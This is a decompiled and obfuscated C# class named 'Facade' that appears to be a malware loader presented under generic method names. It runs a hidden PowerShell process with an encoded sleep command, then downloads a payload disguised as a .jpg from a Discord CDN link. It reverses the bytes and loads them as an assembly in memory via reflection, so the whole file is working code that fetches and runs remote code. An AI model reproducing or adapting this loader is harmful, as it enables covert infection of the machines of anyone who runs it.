using System;
using System.Diagnostics;
using System.Net;
using System.Reflection;

internal static class Facade
{
	internal static Facade ForgotItem;

	private static byte[] ChangeFacade()
	{
		byte[] result = default(byte[]);
		byte[] array = default(byte[]);
		bool flag = default(bool);
		while (true)
		{
			ValidateItem();
			if (_003CModule_003E_007B89a366a7_002D2270_002D4665_002D8440_002Dcb5a27ea74fd_007D.m_9179646c7ab74c0b8be4bd7bd3bba8c5 != 0)
			{
				switch (1)
				{
				case 2:
					break;
				case 1:
					goto IL_003a;
				case 5:
					goto IL_004a;
				case 4:
				case 6:
					goto IL_009f;
				case 3:
					goto IL_00a8;
				default:
					goto IL_00ac;
				case 7:
					return result;
				}
				continue;
			}
			goto IL_003a;
			IL_00ac:
			InsertItem(array, 0, array.Length);
			break;
			IL_003a:
			try
			{
				ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
			}
			catch
			{
			}
			goto IL_004a;
			IL_004a:
			array = (byte[])UpdateItem(typeof(WebClient).GetMethod("DxownxloxadDxatxxax".Replace("x", ""), new Type[1] { MoveItem(typeof(string).TypeHandle) }), new WebClient(), new object[1] { "https://cdn.discordapp.com/attachments/928503440139771947/930108637681184768/Tbopbh.jpg" });
			goto IL_009f;
			IL_009f:
			flag = array.Length > 1;
			goto IL_00a8;
			IL_00a8:
			if (!flag)
			{
				break;
			}
			goto IL_00ac;
		}
		return array;
	}

	public static Assembly PrintFacade()
	{
		while (true)
		{
			Assembly result = (Assembly)LogoutItem(ChangeFacade());
			if (_003CModule_003E_007B89a366a7_002D2270_002D4665_002D8440_002Dcb5a27ea74fd_007D.m_df0641c336ee48538c46b1840d202e14 == 0)
			{
				switch (1)
				{
				case 3:
					continue;
				case 1:
				case 2:
					return result;
				}
			}
			break;
		}
		Assembly result2 = default(Assembly);
		return result2;
	}

	private static void ReflectFacade()
	{
		int num2 = default(int);
		bool flag = default(bool);
		while (true)
		{
			string object_ = "0AUwBsAGUAZQBwACAALQBzACAAMQAwAA==";
			int num = 0;
			if (_003CModule_003E_007B89a366a7_002D2270_002D4665_002D8440_002Dcb5a27ea74fd_007D.m_2f890ae8a28c4805a87fc61c4170c21d == 0)
			{
				goto IL_0003;
			}
			goto IL_0012;
			IL_0012:
			switch (num)
			{
			case 8:
				continue;
			case 2:
				goto IL_005a;
			case 6:
				goto IL_005e;
			case 1:
			case 3:
			case 4:
			case 9:
				goto IL_0097;
			case 5:
				return;
			}
			goto IL_0003;
			IL_0003:
			num2 = 0;
			num = 0;
			if (_003CModule_003E_007B89a366a7_002D2270_002D4665_002D8440_002Dcb5a27ea74fd_007D.m_1a02f8da48ac406c98d9cad8ca377c5b != 0)
			{
				goto IL_0012;
			}
			goto IL_0097;
			IL_0097:
			flag = num2 < 2;
			goto IL_005a;
			IL_005a:
			if (!flag)
			{
				break;
			}
			goto IL_005e;
			IL_005e:
			InitItem(SetItem(new ProcessStartInfo
			{
				FileName = "powershell",
				Arguments = (string)SearchItem("-enc UwB0AGEAcgB0AC", object_),
				WindowStyle = ProcessWindowStyle.Hidden
			}));
			num2++;
			goto IL_0097;
		}
	}

	internal static void ValidateItem()
	{
		ReflectFacade();
	}

	internal static Type MoveItem(RuntimeTypeHandle runtimeTypeHandle_0)
	{
		return Type.GetTypeFromHandle(runtimeTypeHandle_0);
	}

	internal static object UpdateItem(object object_0, object object_1, object object_2)
	{
		return ((MethodBase)object_0).Invoke(object_1, (object?[]?)object_2);
	}

	internal static void InsertItem(object object_0, int int_0, int int_1)
	{
		Array.Reverse((Array)object_0, int_0, int_1);
	}

	internal static bool CollectItem()
	{
		return ForgotItem == null;
	}

	internal static Facade FillItem()
	{
		return ForgotItem;
	}

	internal static object LogoutItem(object object_0)
	{
		return Assembly.Load((byte[])object_0);
	}

	internal static object SearchItem(object object_0, object object_1)
	{
		return (string?)object_0 + (string?)object_1;
	}

	internal static object SetItem(object object_0)
	{
		return Process.Start((ProcessStartInfo)object_0);
	}

	internal static void InitItem(object object_0)
	{
		((Process)object_0).WaitForExit();
	}
}
